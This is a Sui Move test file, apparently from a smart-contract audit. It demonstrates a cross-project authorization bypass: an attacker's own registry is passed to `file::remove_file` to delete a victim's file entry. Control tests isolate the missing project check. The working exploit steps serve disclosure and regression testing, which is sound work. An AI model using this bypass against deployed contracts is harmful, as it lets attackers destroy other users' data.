#[test_only]
module content_vault::audit_poc_tests;

/// PoC for Finding 4822 — `file::remove_file` is missing the
/// `access::project_id(registry) == file.project_id` binding that every sibling
/// mutator (`create_file`, `add_version`, `create_directory`,
/// `remove_directory`, `move_file_entry`) enforces. An attacker who controls
/// ANY `AccessRegistry` they hold WRITE on (e.g. their own project's registry)
/// can pass it in place of the victim project's registry and delete the victim's
/// directory entry, because `assert_perm` only inspects the *passed-in* registry.

use content_vault::access::{Self, AccessRegistry, ProjectAdminCap};
use content_vault::directory::{Self, Directory};
use content_vault::file;
use content_vault::project;
use content_vault::utils;
use std::string;
use sui::clock::Clock;
use sui::test_scenario::{Self as ts, Scenario};

const VICTIM: address = @0xA11CE;
const ATTACKER: address = @0xBAD0;

fun setup(scenario: &mut Scenario) {
    scenario.create_system_objects();
}

/// Create + finalize a project. Returns the admin cap transferred to the
/// caller so subsequent txs in the same scenario can pull it from sender.
fun bootstrap_project(scenario: &mut Scenario, sender: address, title: vector<u8>) {
    scenario.next_tx(sender);
    {
        let clock = scenario.take_shared<Clock>();
        let (cap, registry, root, project) =
            project::create_project(string::utf8(title), &clock, scenario.ctx());
        project::share_project_objects(registry, root, project);
        transfer::public_transfer(cap, sender);
        ts::return_shared(clock);
    };
}

/// Pull (project, root, registry) out of the scenario shared pool.
fun take_bundle(scenario: &Scenario): (project::Project, Directory, AccessRegistry) {
    let p = scenario.take_shared<project::Project>();
    let root = ts::take_shared_by_id<Directory>(scenario, p.root_directory_id());
    let registry = ts::take_shared_by_id<AccessRegistry>(scenario, p.access_registry_id());
    (p, root, registry)
}

/// When multiple projects exist in the pool, pull a specific one by id.
fun take_project_by_id(
    scenario: &Scenario,
    project_id: ID,
): (project::Project, Directory, AccessRegistry) {
    let p = ts::take_shared_by_id<project::Project>(scenario, project_id);
    let root = ts::take_shared_by_id<Directory>(scenario, p.root_directory_id());
    let registry = ts::take_shared_by_id<AccessRegistry>(scenario, p.access_registry_id());
    (p, root, registry)
}

fun return_bundle(p: project::Project, root: Directory, r: AccessRegistry) {
    ts::return_shared(p);
    ts::return_shared(root);
    ts::return_shared(r);
}

/// ===================================================================
/// Finding 4822 — cross-project authorization bypass in `file::remove_file`.
/// ===================================================================
///
/// Victim (VICTIM) creates a project and a file inside its root directory.
/// Attacker (ATTACKER) creates their OWN project (permissionless
/// `create_project` → `bootstrap_grant(..., full())`), so ATTACKER holds WRITE
/// on attacker_registry — but attacker_registry.project_id != victim project id.
///
/// ATTACKER then calls `file::remove_file(&victim_file, &mut victim_dir,
/// &attacker_registry, victim_name_hash, ctx)`.
///
/// In a correct implementation this must abort, because `remove_file` should
/// assert `access::project_id(registry) == file.project_id` (mirroring
/// `create_file:108`, `add_version:227`, `move_file_entry:204`). The deployed
/// `remove_file` omits that check, so the call succeeds and the victim's
/// directory entry is silently deleted.
#[test]
fun test_poc_4822_remove_file_cross_project_auth_bypass() {
    let mut scenario = ts::begin(VICTIM);
    setup(&mut scenario);

    // ---- Victim creates a project with a file in its root directory. ----
    bootstrap_project(&mut scenario, VICTIM, b"Victim");

    let mut victim_project_id;
    let mut victim_file_id;
    let mut victim_name_hash;

    scenario.next_tx(VICTIM);
    {
        let (project, mut root, registry) = take_bundle(&scenario);
        let clock = scenario.take_shared<Clock>();

        victim_project_id = project.id();
        victim_name_hash = utils::name_hash(project.id(), b"secret.txt");

        victim_file_id = file::create_file(
            &mut root,
            &registry,
            victim_name_hash,
            b"text/plain",
            b"blob-v1",
            b"hash-v1",
            1,
            b"meta-v1",
            100,
            &clock,
            scenario.ctx(),
        );

        // sanity: entry is present and counts as 1
        assert!(directory::contains(&root, victim_name_hash), 100);
        assert!(directory::entry_count(&root) == 1, 101);

        ts::return_shared(clock);
        return_bundle(project, root, registry);
    };

    // ---- Attacker creates their own project (permissionless). ----
    bootstrap_project(&mut scenario, ATTACKER, b"Attacker");

    let mut attacker_project_id;
    let mut attacker_file_id_unused;
    let mut attacker_name_hash_unused;

    scenario.next_tx(ATTACKER);
    {
        // Take BOTH project bundles out so we can mutate the attacker's
        // registry and reference attacker objects at the same time.
        // The Sui shared pool is LIFO per-type, so the attacker's project
        // (shared last) comes out first.
        let (a_project, mut a_root, mut a_registry) = take_bundle(&scenario);
        let clock = scenario.take_shared<Clock>();

        attacker_project_id = a_project.id();
        attacker_name_hash_unused = utils::name_hash(a_project.id(), b"decoy.txt");

        attacker_file_id_unused = file::create_file(
            &mut a_root,
            &a_registry,
            attacker_name_hash_unused,
            b"text/plain",
            b"x",
            b"x",
            1,
            b"x",
            100,
            &clock,
            scenario.ctx(),
        );

        // Sanity: attacker has WRITE on their own registry, and that registry
        // is bound to a *different* project than the victim's file/dir.
        assert!(access::has_perm(&a_registry, ATTACKER, access::write()), 200);
        assert!(access::project_id(&a_registry) == attacker_project_id, 201);
        assert!(access::project_id(&a_registry) != victim_project_id, 202);

        ts::return_shared(clock);
        return_bundle(a_project, a_root, a_registry);
    };

    // ---- THE EXPLOIT: attacker removes the victim's file entry using
    //      attacker's OWN registry as the auth oracle. ----
    scenario.next_tx(ATTACKER);
    {
        // Pull attacker's registry + attacker's project out (so we keep
        // them alive in scope), and pull the victim's project + file too.
        let attacker_project =
            ts::take_shared_by_id<project::Project>(&scenario, attacker_project_id);
        let attacker_registry = ts::take_shared_by_id<AccessRegistry>(
            &scenario,
            attacker_project.access_registry_id(),
        );

        let (victim_project, mut victim_root, _victim_registry) =
            take_project_by_id(&scenario, victim_project_id);
        let victim_file = ts::take_shared_by_id<file::File>(&scenario, victim_file_id);

        // Pre-condition: victim directory still has the entry.
        assert!(directory::contains(&victim_root, victim_name_hash), 300);
        assert!(directory::entry_count(&victim_root) == 1, 301);

        // Attacker DOES NOT have any permission on the victim's actual
        // registry — only on their own.
        assert!(!access::has_perm(&_victim_registry, ATTACKER, access::write()), 302);

        // *** BUG *** — this call must abort in a correct implementation,
        // but the deployed `remove_file` does not bind registry↔project,
        // so it succeeds with the attacker's own registry.
        file::remove_file(
            &victim_file,
            &mut victim_root,
            &attacker_registry,
            victim_name_hash,
            scenario.ctx(),
        );

        // The victim's directory entry is gone — the exploit worked.
        assert!(!directory::contains(&victim_root, victim_name_hash), 400);
        assert!(directory::entry_count(&victim_root) == 0, 401);

        ts::return_shared(victim_file);
        ts::return_shared(_victim_registry);
        return_bundle(victim_project, victim_root, attacker_registry);
        ts::return_shared(attacker_project);
    };

    scenario.end();
}

/// Negative control — same setup, but using the victim's *own* registry still
/// works (proves the test harness and signatures are correct, and that the
/// exploit failure in `test_poc_4822_*` is purely due to the missing
/// registry↔project binding, not some unrelated setup issue).
#[test]
fun test_poc_4822_negative_control_owner_can_remove() {
    let mut scenario = ts::begin(VICTIM);
    setup(&mut scenario);

    bootstrap_project(&mut scenario, VICTIM, b"OwnerCtrl");

    let mut victim_file_id;
    let mut victim_name_hash;

    scenario.next_tx(VICTIM);
    {
        let (project, mut root, registry) = take_bundle(&scenario);
        let clock = scenario.take_shared<Clock>();
        victim_name_hash = utils::name_hash(project.id(), b"owner.txt");
        victim_file_id = file::create_file(
            &mut root,
            &registry,
            victim_name_hash,
            b"text/plain",
            b"b",
            b"h",
            1,
            b"m",
            100,
            &clock,
            scenario.ctx(),
        );
        ts::return_shared(clock);
        return_bundle(project, root, registry);
    };

    scenario.next_tx(VICTIM);
    {
        let (project, mut root, registry) = take_bundle(&scenario);
        let file_obj = ts::take_shared_by_id<file::File>(&scenario, victim_file_id);
        file::remove_file(&file_obj, &mut root, &registry, victim_name_hash, scenario.ctx());
        assert!(!directory::contains(&root, victim_name_hash), 0);
        assert!(directory::entry_count(&root) == 0, 1);
        ts::return_shared(file_obj);
        return_bundle(project, root, registry);
    };

    scenario.end();
}

/// Positive invariant — `create_file` DOES enforce the registry↔project
/// binding (line 108). Demonstrates that the same attacker trick fails on the
/// sibling function, isolating the bug to `remove_file`.
#[test, expected_failure(abort_code = content_vault::file::EWrongProject)]
fun test_poc_4822_create_file_enforces_project_binding() {
    let mut scenario = ts::begin(VICTIM);
    setup(&mut scenario);

    bootstrap_project(&mut scenario, VICTIM, b"Victim2");
    bootstrap_project(&mut scenario, ATTACKER, b"Attacker2");

    let mut victim_project_id;
    let mut attacker_project_id;

    // Resolve both project ids by popping them LIFO (attacker was shared last).
    scenario.next_tx(ATTACKER);
    {
        let attacker_project = scenario.take_shared<project::Project>();
        attacker_project_id = attacker_project.id();
        let victim_project = scenario.take_shared<project::Project>();
        victim_project_id = victim_project.id();
        ts::return_shared(victim_project);
        ts::return_shared(attacker_project);
    };

    scenario.next_tx(ATTACKER);
    {
        let attacker_project =
            ts::take_shared_by_id<project::Project>(&scenario, attacker_project_id);
        let attacker_registry = ts::take_shared_by_id<AccessRegistry>(
            &scenario,
            attacker_project.access_registry_id(),
        );

        let (victim_project, mut victim_root, _victim_registry) =
            take_project_by_id(&scenario, victim_project_id);

        let clock = scenario.take_shared<Clock>();
        let name = utils::name_hash(victim_project.id(), b"should_fail.txt");

        // Same shape of attack as the remove_file exploit, but on create_file.
        // This MUST abort with EWrongProject — proving the binding check is
        // present on create_file and absent on remove_file.
        file::create_file(
            &mut victim_root,
            &attacker_registry,
            name,
            b"text/plain",
            b"x",
            b"x",
            1,
            b"x",
            100,
            &clock,
            scenario.ctx(),
        );

        ts::return_shared(clock);
        ts::return_shared(_victim_registry);
        ts::return_shared(victim_root);
        ts::return_shared(victim_project);
        ts::return_shared(attacker_registry);
        ts::return_shared(attacker_project);
    };

    scenario.end();
}
